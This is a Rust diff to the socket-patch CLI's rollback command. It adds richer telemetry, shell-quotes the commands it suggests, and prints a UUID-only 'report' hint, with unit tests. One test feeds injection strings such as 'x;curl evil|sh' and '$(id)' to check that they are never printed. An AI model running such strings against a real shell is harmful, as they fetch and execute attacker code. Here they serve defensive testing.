@@ -12,7 +12,9 @@ use socket_patch_core::patch::rollback::{
     cannot_rollback_error, rollback_package_patch, verify_file_rollback, RollbackResult,
     VerifyRollbackResult, VerifyRollbackStatus,
 };
-use socket_patch_core::telemetry::{track_patch_rollback_failed, track_patch_rolled_back};
+use socket_patch_core::telemetry::{
+    track_patch_rollback_failed, track_patch_rolled_back, RollbackRun, TelemetryAuth, MODE_AGENT,
+};
 use socket_patch_core::utils::purl::strip_purl_qualifiers;
 use socket_patch_core::utils::purl_key::PurlKey;
 use socket_patch_core::utils::target::{is_path_shaped, Target, TargetKind};
@@ -349,18 +351,26 @@ async fn patched_in_other_scope(
 
 /// `rollback`'s pointer at the scope that still holds a patched copy: a
 /// rollback of just that purl, naming `--cwd` when the run used one (the record lives in that
-/// project's manifest).
+/// project's manifest). The command names the release without the record's
+/// qualifiers (`?platform=ruby`, `?artifact_id=...`): the record was kept
+/// with its whole variant group, a base purl selects that group, and a `?`
+/// is a glob character to the shell. The purl and the directory are quoted
+/// where a shell would otherwise read them as more than one word.
 fn patched_in_other_scope_warning(purl: &str, path: &Path, common: &GlobalArgs) -> String {
+    let word = crate::ui::shell_word(strip_purl_qualifiers(purl));
     let (scope, mut command) = if common.is_global() {
-        ("the project", format!("socket-patch rollback {purl}"))
+        ("the project", format!("socket-patch rollback {word}"))
     } else {
         (
             "the global install",
-            format!("socket-patch rollback {purl} -g"),
+            format!("socket-patch rollback {word} -g"),
         )
     };
     if common.cwd != Path::new(".") {
-        command.push_str(&format!(" --cwd {}", common.cwd.display()));
+        command.push_str(&format!(
+            " --cwd {}",
+            crate::ui::shell_word(&common.cwd.to_string_lossy())
+        ));
     }
     format!(
         "{purl}: its copy in {scope} ({}) is still patched or could not be \
@@ -1098,10 +1108,10 @@ struct VendoredLegOutcome {
     /// could not be saved.
     failed: Vec<(String, &'static str, String)>,
     warnings: Vec<(String, String)>,
-    /// The gems (ledger keys) whose installed copies the unwind brought
-    /// back to the upstream build: nothing of theirs is left for a
-    /// reinstall.
-    refreshed_installs: std::collections::BTreeSet<String>,
+    /// The gems (ledger keys) with no installed copy left on the patched
+    /// build, brought back to the upstream one or found to be it already:
+    /// nothing of theirs is left for a reinstall.
+    upstream_installs: std::collections::BTreeSet<String>,
     /// `removed` / `vendor_orphan_removed` events for the orphan uuid
     /// dirs (no ledger entry) swept, also on dry-run.
     orphans_removed: Vec<PatchEvent>,
@@ -1134,13 +1144,13 @@ async fn run_vendored_leg(
         key,
         warnings,
         progress,
-        gem_install_refreshed,
+        gem_install_upstream,
         step,
         ..
     } in reverted
     {
-        if gem_install_refreshed {
-            out.refreshed_installs.insert(key.clone());
+        if gem_install_upstream {
+            out.upstream_installs.insert(key.clone());
         }
         for w in &warnings {
             if loud {
@@ -1589,6 +1599,84 @@ impl BelowNotes {
 /// the patched project directories below it.
 const PROJECTS_NOT_ROLLED_BACK: &str = "projects_not_rolled_back";
 
+/// What a rollback event says about the run itself.
+fn rollback_run(args: &RollbackArgs, rolled_back_count: usize) -> RollbackRun {
+    RollbackRun {
+        rolled_back_count,
+        dry_run: args.common.dry_run,
+        targeted: !args.targets.is_empty(),
+    }
+}
+
+/// Telemetry for a rollback that ended before it reached a patch: a
+/// manifest it could not read, a target that matched nothing. `code` is
+/// the run's `--json` error code, which is what tells a mistyped target
+/// from a patch that would not come off.
+async fn track_unstarted(
+    args: &RollbackArgs,
+    code: &str,
+    error: impl std::fmt::Display,
+    telemetry: &TelemetryAuth,
+) {
+    track_patch_rollback_failed(code, error, rollback_run(args, 0), &[], telemetry).await;
+}
+
+/// The most patches a rollback's report hint names: past this the
+/// command no longer fits a line, and the run was not about one patch.
+const REPORT_HINT_MAX_PATCHES: usize = 3;
+
+/// The line a rollback of a few named patches ends with at a terminal:
+/// the `report` command for the patches it took off, ready to run. A
+/// patch is usually rolled back because it broke something, and by then
+/// the project no longer holds it, so only its UUID still names it.
+///
+/// `None` when the run took off no patch, or more than a line can name,
+/// or one whose recorded id is not a UUID. A manifest's `uuid` is a
+/// string a project file supplies: only a real UUID is ever printed as
+/// part of a command to run, and `report` takes nothing else for a patch
+/// the project no longer holds.
+fn report_hint(patches: &[socket_patch_core::telemetry::PatchOutcome]) -> Option<String> {
+    let mut uuids: Vec<&str> = Vec::new();
+    for patch in patches.iter().filter(|p| p.outcome == "rolled_back") {
+        if !socket_patch_core::utils::target::is_uuid_shaped(&patch.uuid) {
+            return None;
+        }
+        if !uuids.contains(&patch.uuid.as_str()) {
+            uuids.push(&patch.uuid);
+        }
+    }
+    if uuids.is_empty() || uuids.len() > REPORT_HINT_MAX_PATCHES {
+        return None;
+    }
+    Some(format!(
+        "Did {} break something? Tell Socket: socket-patch report {} --message \"what happened\"",
+        if uuids.len() == 1 {
+            "this patch"
+        } else {
+            "one of these patches"
+        },
+        uuids.join(" ")
+    ))
+}
+
+/// The patches a rollback's events name, as its telemetry reports them.
+/// The manifest cleanup's `removed` events are left out: they say a record
+/// was dropped, and the patch's own event already says what happened to
+/// the package.
+fn reported_rollback_patches(env: &Envelope) -> Vec<socket_patch_core::telemetry::PatchOutcome> {
+    crate::telemetry_outcomes::patch_outcomes_of(
+        env.events.iter().filter(|event| {
+            !event
+                .details
+                .as_ref()
+                .and_then(|details| details.get("manifest"))
+                .and_then(serde_json::Value::as_bool)
+                .unwrap_or(false)
+        }),
+        MODE_AGENT,
+    )
+}
+
 pub async fn run(args: RollbackArgs) -> i32 {
     use crate::commands::projects_below::{self, Depth, Work};
     apply_env_toggles(&args.common);
@@ -1830,8 +1918,8 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
     let manifest_missing = match manifest_exists(&manifest_path).await {
         Ok(present) => !present,
         Err(e) => {
-            track_patch_rollback_failed(&e.to_string(), &telemetry).await;
             let err = crate::json_envelope::manifest_load_error(&manifest_path, &e);
+            track_unstarted(&args, &err.code, e.to_string(), &telemetry).await;
             emit_rollback_error(
                 args.common.json,
                 args.common.dry_run,
@@ -1996,7 +2084,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
             Ok(None) => {
                 // Deleted between the existence probe and the read.
                 let msg = format!("Manifest not found at {}", manifest_path.display());
-                track_patch_rollback_failed(&msg, &telemetry).await;
+                track_unstarted(&args, "manifest_not_found", &msg, &telemetry).await;
                 emit_rollback_error(
                     args.common.json,
                     args.common.dry_run,
@@ -2007,7 +2095,13 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
             }
             Err(e) => {
                 let msg = e.to_string();
-                track_patch_rollback_failed(&msg, &telemetry).await;
+                track_unstarted(
+                    &args,
+                    crate::json_envelope::manifest_load_error_code(&e),
+                    &msg,
+                    &telemetry,
+                )
+                .await;
                 if args.common.json {
                     let err = crate::json_envelope::manifest_load_error(&manifest_path, &e);
                     println!(
@@ -2083,7 +2177,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
         if let Ok(state) = &vendor_state_result {
             if let Some(detail) = unledgered_vendor_wiring(&args.common, &ledger_root, state).await
             {
-                track_patch_rollback_failed(&detail, &telemetry).await;
+                track_unstarted(&args, "vendor_ledger_missing", &detail, &telemetry).await;
                 emit_rollback_error(
                     args.common.json,
                     args.common.dry_run,
@@ -2133,7 +2227,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
         let id = match settled {
             Ok(settled) => settled,
             Err(msg) => {
-                track_patch_rollback_failed(&msg, &telemetry).await;
+                track_unstarted(&args, "ambiguous_target", &msg, &telemetry).await;
                 emit_rollback_error(
                     args.common.json,
                     args.common.dry_run,
@@ -2155,7 +2249,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                 format!(" (to target a directory instead, use ./{id} or {id}/**)")
             };
             let msg = format!("No patch found matching identifier: {id}{hint}");
-            track_patch_rollback_failed(&msg, &telemetry).await;
+            track_unstarted(&args, "patch_not_found", &msg, &telemetry).await;
             if args.common.json {
                 let mut env = error_envelope(
                     args.common.dry_run,
@@ -2229,7 +2323,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                  identifier or an unscoped rollback)",
                 unmatched.1
             );
-            track_patch_rollback_failed(&msg, &telemetry).await;
+            track_unstarted(&args, "path_glob_no_match", &msg, &telemetry).await;
             emit_rollback_error(
                 args.common.json,
                 args.common.dry_run,
@@ -2659,9 +2753,6 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
             let gc_bytes_freed = gc.map_or(0, |gc| gc.bytes_freed);
 
             // ── run-level warnings ───────────────────────────────────────
-            let unwired_any = !vendored_leg.reverted.is_empty()
-                || !vendored_leg.preserved.is_empty()
-                || !hosted_leg.reverted.is_empty();
             let advised = ReinstallAdvised::of(
                 vendored_leg
                     .warnings
@@ -2669,7 +2760,33 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                     .chain(hosted_leg.warnings.iter())
                     .map(|(code, _)| code.as_str()),
             );
-            if unwired_any {
+            // Only packages that are NOT also handled in place keep
+            // patched bytes. A successful in-place result that verified
+            // files leaves the installed tree original: restored now,
+            // restorable (dry run), or already original (never
+            // patched). None of those has anything left to reinstall.
+            let restored = handled_in_place(&results);
+            let base_of = |key: &str| {
+                vendor_entries
+                    .iter()
+                    .find(|(k, _)| k == key)
+                    .map(|(_, e)| e.base_purl.clone())
+            };
+            let still_patched = vendored_leg
+                .reverted
+                .iter()
+                .chain(vendored_leg.preserved.iter())
+                .chain(hosted_leg.reverted.iter())
+                .filter(|key| {
+                    !restored.contains(strip_purl_qualifiers(key))
+                        && !base_of(key).is_some_and(|b| restored.contains(b.as_str()))
+                        // A gem the unwind brought back to its upstream
+                        // build, or found on it already (#2214).
+                        && !hosted_leg.refreshed_installs.contains(key.as_str())
+                        && !vendored_leg.upstream_installs.contains(key.as_str())
+                })
+                .count();
+            if still_patched > 0 {
                 run_warnings.push((
                     "reinstall_required".into(),
                     format!(
@@ -2785,6 +2902,34 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                     format!("failed to update the manifest: {e}"),
                 ));
             }
+
+            // Telemetry names the patches the `--json` envelope's events
+            // name, so the two cannot disagree: the same report, built
+            // without the run-level extras no event of it carries.
+            let reported_patches =
+                reported_rollback_patches(&build_rollback_envelope(&RollbackReport {
+                    dry_run: args.common.dry_run,
+                    success,
+                    manifest: &manifest,
+                    results: &results,
+                    not_installed: &not_installed,
+                    unsupported_skips: &unsupported_skips,
+                    invalid_keys: &invalid_keys,
+                    project_owned: if project_state {
+                        &[]
+                    } else {
+                        &vendored_excluded
+                    },
+                    vendored: &vendored_leg,
+                    vendor_entries: &vendor_entries,
+                    hosted: &hosted_leg,
+                    hosted_pins: &hosted_pins,
+                    contested: contested.as_deref(),
+                    removed: &removed,
+                    gc: None,
+                    warnings: &[],
+                    paths: path_scope.raw(),
+                }));
 
             if args.common.json {
                 // The GC was requested (not `--preserve-state`) but could not
@@ -2938,32 +3083,6 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                     }
                     println!("{}", format_gc_freed(gc_bytes_freed, args.common.dry_run));
                 }
-                // Only packages that are NOT also handled in place keep
-                // patched bytes. A successful in-place result that verified
-                // files leaves the installed tree original: restored now,
-                // restorable (dry run), or already original (never
-                // patched). None of those has anything left to reinstall.
-                let restored = handled_in_place(&results);
-                let base_of = |key: &str| {
-                    vendor_entries
-                        .iter()
-                        .find(|(k, _)| k == key)
-                        .map(|(_, e)| e.base_purl.clone())
-                };
-                let still_patched = vendored_leg
-                    .reverted
-                    .iter()
-                    .chain(vendored_leg.preserved.iter())
-                    .chain(hosted_leg.reverted.iter())
-                    .filter(|key| {
-                        !restored.contains(strip_purl_qualifiers(key))
-                            && !base_of(key).is_some_and(|b| restored.contains(b.as_str()))
-                            // A gem the hosted leg already brought back to
-                            // its upstream build.
-                            && !hosted_leg.refreshed_installs.contains(key.as_str())
-                            && !vendored_leg.refreshed_installs.contains(key.as_str())
-                    })
-                    .count();
                 if still_patched > 0 {
                     println!(
                         "\n{}",
@@ -2999,10 +3118,33 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
                 }
             }
 
+            // Someone at a terminal who named the patches to take off is
+            // told how to report them. Never a dry run, `--json`,
+            // `--silent`, a pipe or an agent's terminal.
+            if success
+                && !args.targets.is_empty()
+                && !args.common.dry_run
+                && !args.common.json
+                && !args.common.silent
+                && crate::ui::attended(crate::ui::Stream::Stdout)
+            {
+                if let Some(hint) = report_hint(&reported_patches) {
+                    println!("\n{}", crate::ui::dim(&hint, crate::ui::stdout_color()));
+                }
+            }
+
+            let run = rollback_run(&args, rolled_back_total);
             if success {
-                track_patch_rolled_back(rolled_back_total, &telemetry).await;
+                track_patch_rolled_back(run, &reported_patches, &telemetry).await;
             } else {
-                track_patch_rollback_failed("One or more rollbacks failed", &telemetry).await;
+                track_patch_rollback_failed(
+                    "rollback_failed",
+                    "One or more rollbacks failed",
+                    run,
+                    &reported_patches,
+                    &telemetry,
+                )
+                .await;
             }
 
             if success {
@@ -3012,7 +3154,7 @@ async fn run_project(args: RollbackArgs, below: BelowNotes) -> i32 {
             }
         }
         Err(e) => {
-            track_patch_rollback_failed(&e, &telemetry).await;
+            track_unstarted(&args, "rollback_failed", &e, &telemetry).await;
             if args.common.json {
                 println!(
                     "{}",
@@ -4409,8 +4551,117 @@ async fn rollback_maven_target(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// The report hint names the patches a run took off, each once, and
+    /// stays quiet when there are none or too many to name on a line.
+    #[test]
+    fn report_hint_names_the_patches_taken_off() {
+        use socket_patch_core::telemetry::{PatchOutcome, MODE_HOSTED};
+        const A: &str = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa";
+        const B: &str = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb";
+        let patch = |uuid: &str, mode, outcome| PatchOutcome {
+            uuid: uuid.to_string(),
+            ecosystem: "npm".to_string(),
+            mode,
+            outcome,
+            code: None,
+        };
+        assert_eq!(report_hint(&[]), None);
+        assert_eq!(report_hint(&[patch(A, MODE_AGENT, "skipped")]), None);
+        assert_eq!(
+            report_hint(&[
+                patch(A, MODE_AGENT, "rolled_back"),
+                patch(A, MODE_HOSTED, "rolled_back"),
+                patch(B, MODE_AGENT, "failed"),
+            ]),
+            Some(format!(
+                "Did this patch break something? Tell Socket: socket-patch report {A} \
+                 --message \"what happened\""
+            ))
+        );
+        assert_eq!(
+            report_hint(&[
+                patch(A, MODE_AGENT, "rolled_back"),
+                patch(B, MODE_AGENT, "rolled_back"),
+            ]),
+            Some(format!(
+                "Did one of these patches break something? Tell Socket: socket-patch report \
+                 {A} {B} --message \"what happened\""
+            ))
+        );
+        let many: Vec<PatchOutcome> = (0..4)
+            .map(|n| {
+                patch(
+                    &format!("{n:08x}-aaaa-4aaa-8aaa-aaaaaaaaaaaa"),
+                    MODE_AGENT,
+                    "rolled_back",
+                )
+            })
+            .collect();
+        assert_eq!(report_hint(&many), None);
+
+        // A recorded id is whatever the manifest says. One that is not a
+        // UUID is never printed as part of a command: `report` would not
+        // find it, and it could be anything.
+        for id in ["local-1", "x;curl evil|sh", "$(id)"] {
+            assert_eq!(
+                report_hint(&[
+                    patch(A, MODE_AGENT, "rolled_back"),
+                    patch(id, MODE_AGENT, "rolled_back"),
+                ]),
+                None,
+                "{id}"
+            );
+        }
+    }
     use socket_patch_core::manifest::schema::{PatchManifest, PatchRecord};
     use std::collections::HashMap;
+
+    /// The command this warning tells the user to run is one they paste.
+    /// A record's purl can carry qualifiers (`?platform=ruby`,
+    /// `?artifact_id=...`), and `?` is a glob character: the command names
+    /// the release, which selects the variant group the run kept. What is
+    /// left that a shell reads specially (`%40`, a space in `--cwd`) is
+    /// quoted (#2182).
+    #[test]
+    fn other_scope_warning_prints_a_command_a_shell_reads_as_written() {
+        let quoted = |word: &str| {
+            if cfg!(windows) {
+                format!("\"{word}\"")
+            } else {
+                format!("'{word}'")
+            }
+        };
+        let purl = "pkg:gem/rack@3.1.8?platform=ruby";
+        let path = Path::new("/gems/rack-3.1.8");
+        let local = crate::args::GlobalArgs::default();
+        let warning = patched_in_other_scope_warning(purl, path, &local);
+        assert!(
+            warning.contains("run `socket-patch rollback pkg:gem/rack@3.1.8 -g` to"),
+            "{warning}"
+        );
+        // The message's own naming of the record stays its full purl.
+        assert!(
+            warning.starts_with(&format!("{purl}: its copy in")),
+            "{warning}"
+        );
+
+        let scoped = "pkg:npm/%40scope/a@1.0.0";
+        let global = crate::args::GlobalArgs {
+            global: true,
+            cwd: PathBuf::from("my app"),
+            ..crate::args::GlobalArgs::default()
+        };
+        let warning = patched_in_other_scope_warning(scoped, path, &global);
+        assert!(
+            warning.contains(&format!(
+                "run `socket-patch rollback {} --cwd {}` to",
+                quoted(scoped),
+                quoted("my app")
+            )),
+            "{warning}"
+        );
+    }
 
     // The legacy path-taking delegation shape, kept for the unit tests below
     // (`remove` now threads its already-loaded manifest and ledger straight
@@ -6884,7 +7135,7 @@ mod tests {
                 "boom".to_string(),
             )],
             warnings: Vec::new(),
-            refreshed_installs: Default::default(),
+            upstream_installs: Default::default(),
             orphans_removed: Vec::new(),
         };
         let hosted = HostedLegOutcome {
